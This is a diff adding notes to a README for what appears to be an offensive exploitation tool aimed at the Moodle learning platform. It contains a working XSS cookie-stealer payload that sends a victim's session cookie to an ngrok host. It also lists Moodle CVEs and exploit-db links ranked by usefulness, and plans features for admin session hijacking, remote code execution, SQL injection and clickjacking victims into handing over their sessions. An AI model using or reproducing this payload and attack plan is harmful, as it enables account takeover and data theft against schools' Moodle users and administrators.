@@ -9,6 +9,48 @@ TODO: Write installation instructions here
 ## Usage
 
 TODO: Write usage instructions here
+Thanks moodle for giving code to pwn self:
+https://docs.moodle.org/dev/Security:Cross-site_scripting
+
+My cookie stealer:
+<script>alert('xss');document.write('<img src="https://668da81e.ngrok.io/?cookie=' + document.cookie + '" />')</script>
+
+https://moodle.org/mod/forum/discuss.php?d=384010 3.6 login as, hijack admin account
+
+https://www.cvedetails.com/cve/CVE-2018-1045/ 3.3.4 XSS in calendar event name
+
+https://moodle.org/mod/forum/discuss.php?d=381230 3.6 could use a clickhijack to self
+
+https://moodle.org/mod/forum/discuss.php?d=384011 3.6 (fresh!) enum events
+
+https://www.cvedetails.com/cve/CVE-2017-2641/ used by exploit below
+
+https://www.exploit-db.com/exploits/41828 3.2.1 SQL injection
+
+https://www.exploit-db.com/exploits/46551 3.4.1 RCE
+
+https://www.cvedetails.com/cve/CVE-2018-1133/ 3.4.2 remote code exec for teacher "Calculated question"
+
+https://www.cvedetails.com/cve/CVE-2018-14630/ 3.5.2 remote code exec for (teacher?) "quiz import"
+
+https://www.cvedetails.com/cve/CVE-2013-4313/ useless
+
+https://www.cvedetails.com/cve/CVE-2016-9187/ useless
+
+https://www.cvedetails.com/cve/CVE-2016-9186/ related, useless
+
+https://www.cvedetails.com/cve/CVE-2011-4295/ useless
+
+https://www.cvedetails.com/cve/CVE-2016-2152/ useless
+
+Features:
+1. scan: detect version (working!), suggest supported exploits
+2. view calendar events bypass
+3. exploit quiz import and calculated question vulns
+4. exploit 2018-1133 RCE
+5. exploit 2017-2641 SQL injection (via user pref) (generate sqlmap command)
+6. add xss to account dashboard, generate clickjacker, using CVE-2019-3810 or CVE-2019-3847 to hijack session
+7. add xss to calendar, generate link for victim to click and steal sesh
 
 ## Development
 
